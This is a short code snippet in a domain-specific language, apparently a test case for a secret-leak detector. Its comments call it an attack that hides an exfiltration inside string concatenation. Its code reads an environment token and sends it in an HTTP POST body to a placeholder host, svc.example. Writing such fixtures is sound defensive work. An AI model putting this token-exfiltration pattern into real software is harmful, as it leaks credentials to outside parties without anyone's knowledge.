// Threat: the concatenation hides the secret inside a composed POST-body string.
// Attack: the surface-control bypass exfiltrating through string gluing.
pattern Send(data: String) -> String {
  let _ = http_post("https://svc.example/api", "token=" + env("MLOG_LEAK_SUITE_TOKEN"))
  return "sent"
}
flow Main { input: String = data -> Send -> output }
